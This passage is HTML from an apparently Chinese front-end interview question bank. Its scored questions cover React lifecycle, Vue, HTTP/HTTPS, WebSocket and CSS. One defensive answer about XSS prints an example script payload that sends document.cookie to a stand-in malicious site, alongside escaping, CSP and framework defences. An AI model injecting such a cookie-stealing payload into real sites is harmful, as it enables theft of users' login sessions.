</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">12. 如何处理浏览器兼容性问题？</h4><div class="head-re"><span class="head-score">4 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。</li>
<li><strong>1：</strong> 使用 Autoprefixer 等工具自动添加前缀。</li>
<li><strong>1：</strong> 测试多个浏览器，确保关键功能正常</li>
<li><strong>1：</strong> 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">63.  || 和 &amp;&amp; 操作符的返回值？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p>|| 和 &amp;&amp; 首先会对第一个操作数执行条件判断，如果其不是布尔值就先强制转换为布尔类型，然后再执行条件判断。</p>
</li>
<li><p>对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。</p>
</li>
<li><p>&amp;&amp; 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。</p>
</li>
<li><p>|| 和 &amp;&amp; 返回它们其中一个操作数的值，而非条件判断的结果。</p>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">1. 什么是 React 的生命周期方法？</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> 类组件声明周期方法:</li>
<li><strong>1：</strong> 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。</li>
<li><strong>1：</strong> 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。</li>
<li><strong>1：</strong> 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。</li>
<li><strong>1：</strong> 函数组件生命周期（Hooks）:</li>
<li><strong>1：</strong> useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。</li>
</ul>
<pre><code class="hljs language-js">
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
<span class="hljs-comment">// 组件挂载时执行的操作</span>
<span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
<span class="hljs-comment">// 组件卸载时清理资源</span>
};
}, [dependencies]);  <span class="hljs-comment">// 依赖数组</span>
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">69. Vue 3 中的 Teleport 是什么？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>Teleport 用于将组件渲染到指定 DOM 节点。</p>
<pre><code class="hljs language-js">
&lt;template&gt;
  &lt;teleport to=&quot;body&quot;&gt;
    &lt;div&gt;Modal&lt;/div&gt;
  &lt;/teleport&gt;
&lt;/template&gt;
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">简述编译器和解释器的区别</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> 编译器会将源程序一次性全部翻译成目标机器可执行的机器语言，如 C、C++ 等语言通过编译器编译后生成可执行文件。解释器则是逐行读取源程序，边解释边执行，并不生成
目标程序，如 Python 语言默认通过解释器运行代码。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">4. HTTP和HTTPS的区别是什么？</h4><div class="head-re"><span class="head-score">5 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p><strong>1：</strong> 安全性：</p>
<ul>
<li>HTTP是明文传输，数据可能被窃听和篡改</li>
<li>HTTPS通过SSL/TLS加密，提供数据加密、身份认证和数���完整性保护</li>
</ul>
</li>
<li><p><strong>1：</strong> 端口：</p>
<ul>
<li>HTTP默认使用80端口</li>
<li>HTTPS默认使用443端口</li>
</ul>
</li>
<li><p><strong>1：</strong> 证书：</p>
<ul>
<li>HTTP不需要证书</li>
<li>HTTPS需要CA机构颁发的SSL证书</li>
</ul>
</li>
<li><p><strong>1：</strong> 性能：</p>
<ul>
<li>HTTP性能更好，因为没有加密解密过程</li>
<li>HTTPS因为需要加密解密，性能会有所损耗</li>
</ul>
</li>
<li><p><strong>1：</strong> 使用场景：</p>
<ul>
<li>HTTP适用于对安全要求不高的场景</li>
<li>HTTPS适用于需要保护用户隐私和数据安全的场景</li>
</ul>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">76. EventBus 与 mitt 区别？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。</p>
<p>如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：</p>
<p>非常小，压缩后仅有 200 bytes。</p>
<p>完整 TS 支持，源码由 TS 编码。</p>
<p>跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。</p>
<p>使用简单，仅有 on、emit、off 等少量实用API。</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">虚拟化（Virtualization）是什么？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> 虚拟化指的是在一台物理计算机上运行多个虚拟计算机，每个虚拟计算机运行着不同的操作系统和应用程序。虚拟化技术可以提高计算机资源利用率，降低IT成本，同时为开发和测试提供更好的环境。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">32. 说一下你知道的 vue 修饰符都有哪些？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>事件修饰符</p>
<ul>
<li><p>.stop：阻止冒泡。</p>
</li>
<li><p>.prevent：阻止默认事件。</p>
</li>
<li><p>.capture：使用事件捕获模式。</p>
</li>
<li><p>.self：只在当前元素本身触发。</p>
</li>
<li><p>once：只触发一次。</p>
</li>
<li><p>passive：默认行为将会立即触发。</p>
</li>
</ul>
<p>按键修饰符</p>
<ul>
<li><p>.left：左键</p>
</li>
<li><p>.right：右键</p>
</li>
<li><p>.middle：滚轮</p>
</li>
<li><p>.enter：回车</p>
</li>
</ul>
<p>表单修饰符</p>
<ul>
<li><p>.lazy：在文本框失去焦点时才会渲染</p>
</li>
<li><p>.number：将文本框中所输入的内容转换为number类型</p>
</li>
<li><p>.trim：可以自动过滤输入首尾的空格</p>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">Rollup 的onwarn选项有什么作用？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong> onwarn选项用于自定义警告信息的处理。可以通过它来忽略某些特定的警告，或者对警告进行统一的日志记录等操作。例如，忽略UNUSED_EXTERNAL_IMPORT警告：</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">input</span>: <span class="hljs-string">&#x27;input.js&#x27;</span>,
    <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">file</span>: <span class="hljs-string">&#x27;output.js&#x27;</span>,
        <span class="hljs-attr">format</span>: <span class="hljs-string">&#x27;iife&#x27;</span>
    },
    <span class="hljs-title function_">onwarn</span>(<span class="hljs-params">warning, warn</span>) {
        <span class="hljs-keyword">if</span> (warning.<span class="hljs-property">code</span> === <span class="hljs-string">&#x27;UNUSED_EXTERNAL_IMPORT&#x27;</span>) <span class="hljs-keyword">return</span>;
        <span class="hljs-title function_">warn</span>(warning);
    }
};
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">29. 原型链的终点是什么？如何打印出原型链的终点？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><pre><code class="hljs language-detail">
由于<span class="hljs-title class_">Object</span>是构造函数，原型链终点是<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>，而<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>=== <span class="hljs-literal">null</span> <span class="hljs-comment">// true，所以，原型链的终点是null。原型链上的所有原型都是对象，所有的对象最终都是由Object构造的，而Object.prototype的下一级是Object.prototype.__proto__。</span>
</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">12. 定义一个泛型函数 `add&lt;T&gt;(a: T, b: T): T`，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问`add&lt;number&gt;(1, 2)`返回值类型是什么</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li>返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">74. Vue 3 中的 onRenderTracked 是什么？</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>onRenderTracked 是调试钩子，用于跟踪渲染依赖。</p>
<pre><code class="hljs language-js">
<span class="hljs-keyword">import</span> { onRenderTracked } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {
    <span class="hljs-title function_">onRenderTracked</span>(<span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;跟踪到依赖:&#x27;</span>, event);
    });
  }
};

</code></pre></details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">15. 数字证书是什么？</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>现在的方法也不一定是安全的，因为没有办法确定得到的公钥就一定是安全的公钥。可能存在一个中间人，截取了对方发给我们的公钥，然后将他自己的公钥发送给我们，当我们使用他的公钥加密后发送的信息，就可以被他用自己的私钥解密。然后他伪装成我们以同样的方法向对方发送信息，这样我们的信息就被窃取了，然而自己还不知道。为了解决这样的问题，可以使用数字证书。</p>
<p>首先使用一种 Hash 算法来对公钥和其他信息进行加密，生成一个信息摘要，然后让有公信力的认证中心（简称 CA ）用它的私钥对消息摘要加密，形成签名。最后将原始的信息和签名合在一起，称为数字证书。当接收方收到数字证书的时候，先根据原始信息使用同样的 Hash 算法生成一个摘要，然后使用公证处的公钥来对数字证书中的摘要进行解密，最后将解密的摘要和生成的摘要进行对比，就能发现得到的信息是否被更改了。</p>
<p>这个方法最要的是认证中心的可靠性，一般浏览器里会内置一些顶层的认证中心的证书，相当于我们自动信任了他们，只有这样才能保证数据的安全。</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">19.你如何在Node.js中使用中间件来组织代码？</h4><div class="head-re"><span class="head-score">3 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p>在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：</p>
</li>
<li><p>定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。</p>
</li>
<li><p>使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。</p>
</li>
<li><p>使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。</p>
</li>
<li><p>在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。</p>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">4. 使元素消失的方法?</h4><div class="head-re"><span class="head-score">1 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><strong>1：</strong><ul>
<li>visibility:hidden;</li>
<li>display:none;</li>
<li>opacity:0;</li>
<li>z-index:-1;</li>
</ul>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">16. HTML5 中的WebSocket是什么？</h4><div class="head-re"><span class="head-score">4 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><ul>
<li><p><strong>1：</strong> 基本概念：</p>
<ul>
<li>基于TCP的全双工通信协议</li>
<li>服务器可以主动推送数据</li>
<li>建立在HTTP协议之上</li>
<li>使用ws://或wss://作为协议前缀</li>
</ul>
</li>
<li><p><strong>1：</strong> 主要特点：</p>
<ul>
<li>持久连接</li>
<li>全双工通信</li>
<li>数据格式轻量</li>
<li>更好的实时性</li>
</ul>
</li>
<li><p><strong>1：</strong> 与HTTP的区别：</p>
<ul>
<li>不需要频繁建立连接</li>
<li>服务器可以主动推送</li>
<li>更低的通信开销</li>
<li>无同源限制</li>
</ul>
</li>
<li><p><strong>1：</strong> 应用场景：</p>
<ul>
<li>实时聊天</li>
<li>游戏通信</li>
<li>实时数据展示</li>
<li>协同编辑</li>
</ul>
</li>
</ul>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">什么是跨站脚本攻击（XSS）？如何防范？</h4><div class="head-re"><span class="head-score">9 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><details>

<ul>
<li><p><strong>2：</strong> 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注
入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：
一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如
<code>&lt;script&gt;document.location = &#39;http://malicious - site.com?cookie=&#39; + document.cookie&lt;/script&gt;</code>。当其他用户访问包含这条评论
的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意
网站<code>（http://malicious - site.com）</code>。</p>
</li>
<li><p><strong>1：</strong> 输入验证和过滤：<br/>
&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。
&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对&lt;、&gt;、&amp;、&quot;、&#39;等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL
 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。</p>
</li>
<li><p><strong>2：</strong> 输出编码：<br/>
&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使
用 HTML 实体编码。例如，<code>将&lt;转义为&amp;lt;，&gt;转义为&amp;gt;</code>。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。</p>
</li>
<li><p><strong>2：</strong> 内容安全策略（CSP）：<br/>
&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设
置<code>Content-Security-Policy: default- src&#39;self&#39;; script-src&#39;self&#39; https://trusted-scripts.com</code>。这意味着默认情况下，只允许来自当前网
站（self）的资源加载，而脚本可以来自当前网站和<code>https://trusted - scripts.com</code>。这样可以防止外部恶意脚本的注入。<br/>
&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为&#39;nonce-value&#39;或&#39;hash-value&#39;来限制内联脚本的执行。内联脚本是直接写在
HTML 标签中的脚本，如<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，
攻击者可能会利用它来执行恶意代码。</p>
</li>
<li><p><strong>2：</strong> 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式<code>（{{}}）</code>时会对内容进行 HTML 转义，防止脚本注入。</p>
</li>
</ul>
</details>

</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">33. transition和animation的区别</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>transition是过度属性，强调过度，它的实现需要触发一个事件（比如鼠标移动上去，焦点，点击等）才执行动画。它类似于flash的补间动画，设置一个开始关键帧，一个结束关键帧。</p>
<p>animation是动画属性，它的实现不需要触发事件，设定好时间之后可以自己执行，且可以循环一个动画。它也类似于flash的补间动画，但是它可以设置多个关键帧（用@keyframe定义）完成动画。</p>
</details></div><div class="main-box_inner"><div class="inner-head"><h4 class="head-title">43. CSS预处理器/后处理器是什么？为什么要使用它们？</h4><div class="head-re"><span class="head-score">2 分</span><input class="head-statistics" type="number" step="1"></div></div><details class="inner-content"><p>预处理器， 如：less，sass，stylus，用来预编译sass或者less，增加了css代码的复用性。层级，mixin， 变量，循环， 函数等对编写以及开发UI组件都极为方便。</p>
<p>后处理器， 如： postCss，通常是在完成的样式表中根据css规范处理css，让其更加有效。目前最常做的是给css属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。</p>
<p>css预处理器为css增加一些编程特性，无需考虑浏览器的兼容问题，可以在CSS中使用变量，简单的逻辑程序，函数等在编程语言中的一些基本的性能，可以让css更加的简洁，增加适应性以及可读性，可维护性等。</p>
<p>使用原因：</p>
<p>结构清晰， 便于扩展</p>
<p>可以很方便的屏蔽浏览器私有语法的差异</p>
<p>可以轻松实现多重继承</p>
<p>完美的兼容了CSS代码，可以应用到老项目中</p>
</details></div><div class="content-scoring"><span>总得分：</span><span class="scoring-num">0</span><button class="export-excel">导出到Excel</button></div></div></div></div></main><footer class="VPDocFooter" data-v-e6f2a212 data-v-1bcd8184><!--[--><!--]--><div class="edit-info" data-v-1bcd8184><!----><div class="last-updated" data-v-1bcd8184><p class="VPLastUpdated" data-v-1bcd8184 data-v-1bb0c8a8>最后更新于: <time datetime="2025-02-10T09:24:53.000Z" data-v-1bb0c8a8></time></p></div></div><nav class="prev-next" aria-labelledby="doc-footer-aria-label" data-v-1bcd8184><span class="visually-hidden" id="doc-footer-aria-label" data-v-1bcd8184>Pager</span><div class="pager" data-v-1bcd8184><!----></div><div class="pager" data-v-1bcd8184><a class="VPLink link pager-link next" href="/mb-front-end-interview/src/training/training-intermediate/index.html" data-v-1bcd8184><!--[--><span class="desc" data-v-1bcd8184>下一页</span><span class="title" data-v-1bcd8184>开始训练</span><!--]--></a></div></nav></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><footer class="VPFooter has-sidebar" data-v-d8b57b2d data-v-566314d4><div class="container" data-v-566314d4><p class="message" data-v-566314d4>基于 MIT 许可发布</p><p class="copyright" data-v-566314d4>版权所有 © 2024-2025 ShanYi-Hui</p></div></footer><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"index.md\":\"BxQmuiZM\",\"ing.md\":\"iQ0V2bBx\",\"readme.md\":\"CRUmtvQK\",\"src_guide_getting-started.md\":\"BweBKn2J\",\"src_guide_why.md\":\"CmwJhxI3\",\"src_questions_artificial-intelligence_1_基础理论.md\":\"9cTa0oRg\",\"src_questions_artificial-intelligence_2_基础应用.md\":\"BhBv-OyQ\",\"src_questions_computer-base_1_计算机硬件.md\":\"Bb_mBBP2\",\"src_questions_computer-base_2_计算机软件.md\":\"H52yjsPE\",\"src_questions_computer-base_3_计算机网络.md\":\"mCTj8LQ-\",\"src_questions_computer-base_4_计算机编程.md\":\"BfNcKffX\",\"src_questions_computer-base_5_计算机科学.md\":\"KWDOf85T\",\"src_questions_computer-base_6_软件工程.md\":\"PQHaUTWq\",\"src_questions_computer-base_7_计算机系统 mac.md\":\"CZu9P5Gf\",\"src_questions_computer-base_8_计算机系统 windows.md\":\"CD3-aEhP\",\"src_questions_data-structures-algorithms_1_算法.md\":\"BxIymun7\",\"src_questions_front-architect_1_前端架构.md\":\"BBDqijwZ\",\"src_questions_front-base_1_html.md\":\"BuIdBDF6\",\"src_questions_front-base_2_css.md\":\"D-DLfdhm\",\"src_questions_front-base_3_javascript.md\":\"D2Hzh4NS\",\"src_questions_front-base_4_typescript.md\":\"DaiTN7-m\",\"src_questions_front-component_1_ui组件库.md\":\"fLDPZLfR\",\"src_questions_front-component_2_业务组件库.md\":\"DfIHDiRT\",\"src_questions_front-engineering_1_前端标准化.md\":\"9WQzReSb\",\"src_questions_front-engineering_2_前端自动化.md\":\"VHp4Tpri\",\"src_questions_front-engineering_3_webpack.md\":\"pHbuspvt\",\"src_questions_front-engineering_4_vite.md\":\"AVRsR6WN\",\"src_questions_front-engineering_5_rollup.md\":\"nW5puyFo\",\"src_questions_front-frame_1_react.md\":\"BgaQKA4L\",\"src_questions_front-frame_2_vue.md\":\"Ceqv9vkh\",\"src_questions_front-frame_3_next.md\":\"DVZ0Nmb7\",\"src_questions_front-frame_4_nuxt.md\":\"7dHwezIb\",\"src_questions_front-frame_5_qiankun.md\":\"CveLRWqN\",\"src_questions_front-newest_1_前端最前沿.md\":\"1pHVy7SS\",\"src_questions_front-perfomance_1_前端性能优化.md\":\"BLqsTn9I\",\"src_questions_front-runtime_1_浏览器.md\":\"CV-TVuAH\",\"src_questions_front-runtime_2_nodejs.md\":\"CnVTt08n\",\"src_questions_front-safety_1_前端安全.md\":\"BYe4NpGg\",\"src_questions_server_1_nest.md\":\"MuU4e3-O\",\"src_questions_server_2_mongodb.md\":\"C6bHs8n9\",\"src_questions_server_3_mysql.md\":\"DciEBzFq\",\"src_questions_server_4_nginx.md\":\"DRpvoHVd\",\"src_questions_server_5_docker.md\":\"BoSSUxzo\",\"src_questions_server_6_kubernets.md\":\"VsPH5w71\",\"src_questions_server_7_nacos.md\":\"B2me6WEW\",\"src_questions_server_8_redis.md\":\"BPheEdWd\",\"src_training_training-architecture_index.md\":\"B9H4qxyy\",\"src_training_training-experts_index.md\":\"G619_Pvr\",\"src_training_training-intermediate_index.md\":\"DM3XRSic\",\"src_training_training-primary_index.md\":\"B6cq_CSz\",\"src_training_training-senior_index.md\":\"D_n29h9O\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"前端面试题库\",\"description\":\"致力于为前端人员提供全面可靠的专业知识\",\"base\":\"/mb-front-end-interview/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"nav\":[{\"text\":\"指南\",\"link\":\"/src/guide/why\",\"activeMatch\":\"/src/guide/\"},{\"text\":\"题库\",\"link\":\"/src/questions/front-base/1_HTML\",\"activeMatch\":\"/src/questions/\"},{\"text\":\"训练\",\"link\":\"/src/training/training-primary/index\",\"activeMatch\":\"/src/training/\"}],\"sidebar\":{\"/src/guide/\":[{\"text\":\"初衷\",\"link\":\"/src/guide/why\"},{\"text\":\"快速开始\",\"link\":\"/src/guide/getting-started\"}],\"/src/questions/\":[{\"text\":\"前端基础\",\"collapsed\":false,\"items\":[{\"text\":\"HTML\",\"link\":\"/src/questions/front-base/1_HTML.md\"},{\"text\":\"CSS\",\"link\":\"/src/questions/front-base/2_CSS.md\"},{\"text\":\"JavaScript\",\"link\":\"/src/questions/front-base/3_JavaScript.md\"},{\"text\":\"TypeScript\",\"link\":\"/src/questions/front-base/4_TypeScript.md\"}]},{\"text\":\"前端运行环境\",\"collapsed\":true,\"items\":[{\"text\":\"浏览器\",\"link\":\"/src/questions/front-runtime/1_浏览器.md\"},{\"text\":\"NodeJS\",\"link\":\"/src/questions/front-runtime/2_NodeJS.md\"}]},{\"text\":\"前端框架\",\"collapsed\":true,\"items\":[{\"text\":\"React\",\"link\":\"/src/questions/front-frame/1_React.md\"},{\"text\":\"Vue\",\"link\":\"/src/questions/front-frame/2_Vue.md\"},{\"text\":\"Next\",\"link\":\"/src/questions/front-frame/3_Next.md\"},{\"text\":\"Nuxt\",\"link\":\"/src/questions/front-frame/4_Nuxt.md\"},{\"text\":\"Qiankun\",\"link\":\"/src/questions/front-frame/5_Qiankun.md\"}]},{\"text\":\"前端工程化\",\"collapsed\":true,\"items\":[{\"text\":\"前端标准化\",\"link\":\"/src/questions/front-engineering/1_前端标准化.md\"},{\"text\":\"前端自动化\",\"link\":\"/src/questions/front-engineering/2_前端自动化.md\"},{\"text\":\"Webpack\",\"link\":\"/src/questions/front-engineering/3_Webpack.md\"},{\"text\":\"Vite\",\"link\":\"/src/questions/front-engineering/4_Vite.md\"},{\"text\":\"Rollup\",\"link\":\"/src/questions/front-engineering/5_Rollup.md\"}]},{\"text\":\"前端组件库\",\"collapsed\":true,\"items\":[{\"text\":\"UI组件库\",\"link\":\"/src/questions/front-component/1_UI组件库.md\"},{\"text\":\"业务组件库\",\"link\":\"/src/questions/front-component/2_业务组件库.md\"}]},{\"text\":\"前端安全\",\"collapsed\":true,\"items\":[{\"text\":\"前端安全\",\"link\":\"/src/questions/front-safety/1_前端安全.md\"}]},{\"text\":\"前端性能\",\"collapsed\":true,\"items\":[{\"text\":\"前端性能优化\",\"link\":\"/src/questions/front-perfomance/1_前端性能优化.md\"}]},{\"text\":\"前端架构\",\"collapsed\":true,\"items\":[{\"text\":\"前端架构\",\"link\":\"/src/questions/front-architect/1_前端架构.md\"}]},{\"text\":\"服务端\",\"collapsed\":true,\"items\":[{\"text\":\"Nest\",\"link\":\"/src/questions/server/1_Nest.md\"},{\"text\":\"MongoDB\",\"link\":\"/src/questions/server/2_MongoDB.md\"},{\"text\":\"MySQL\",\"link\":\"/src/questions/server/3_MySQL.md\"},{\"text\":\"Nginx\",\"link\":\"/src/questions/server/4_Nginx.md\"},{\"text\":\"Docker\",\"link\":\"/src/questions/server/5_Docker.md\"},{\"text\":\"Kubernets\",\"link\":\"/src/questions/server/6_Kubernets.md\"},{\"text\":\"Nacos\",\"link\":\"/src/questions/server/7_Nacos.md\"},{\"text\":\"Redis\",\"link\":\"/src/questions/server/8_Redis.md\"}]},{\"text\":\"数据结构及算法\",\"collapsed\":true,\"items\":[{\"text\":\"算法\",\"link\":\"/src/questions/data-structures-algorithms/1_算法.md\"}]},{\"text\":\"前端最前沿\",\"collapsed\":true,\"items\":[{\"text\":\"前端最前沿\",\"link\":\"/src/questions/front-newest/1_前端最前沿.md\"}]},{\"text\":\"计算机基础\",\"collapsed\":true,\"items\":[{\"text\":\"计算机硬件\",\"link\":\"/src/questions/computer-base/1_计算机硬件.md\"},{\"text\":\"计算机软件\",\"link\":\"/src/questions/computer-base/2_计算机软件.md\"},{\"text\":\"计算机网络\",\"link\":\"/src/questions/computer-base/3_计算机网络.md\"},{\"text\":\"计算机编程\",\"link\":\"/src/questions/computer-base/4_计算机编程.md\"},{\"text\":\"计算机科学\",\"link\":\"/src/questions/computer-base/5_计算机科学.md\"},{\"text\":\"软件工程\",\"link\":\"/src/questions/computer-base/6_软件工程.md\"},{\"text\":\"计算机系统 Mac\",\"link\":\"/src/questions/computer-base/7_计算机系统 Mac.md\"},{\"text\":\"计算机系统 Windows\",\"link\":\"/src/questions/computer-base/8_计算机系统 Windows.md\"}]},{\"text\":\"人工智能\",\"collapsed\":true,\"items\":[{\"text\":\"基础理论\",\"link\":\"/src/questions/artificial-intelligence/1_基础理论.md\"},{\"text\":\"基础应用\",\"link\":\"/src/questions/artificial-intelligence/2_基础应用.md\"}]}],\"/src/training/\":[{\"text\":\"初级\",\"collapsed\":false,\"items\":[{\"text\":\"开始训练\",\"link\":\"/src/training/training-primary/index.md\"}]},{\"text\":\"中级\",\"collapsed\":true,\"items\":[{\"text\":\"开始训练\",\"link\":\"/src/training/training-intermediate/index.md\"}]},{\"text\":\"高级\",\"collapsed\":true,\"items\":[{\"text\":\"开始训练\",\"link\":\"/src/training/training-senior/index.md\"}]},{\"text\":\"架构\",\"collapsed\":true,\"items\":[{\"text\":\"开始训练\",\"link\":\"/src/training/training-architecture/index.md\"}]},{\"text\":\"专家\",\"collapsed\":true,\"items\":[{\"text\":\"开始训练\",\"link\":\"/src/training/training-experts/index.md\"}]}]},\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/syh-micro-build/mb-front-end-interview\"}],\"footer\":{\"message\":\"基于 MIT 许可发布\",\"copyright\":\"版权所有 © 2024-2025 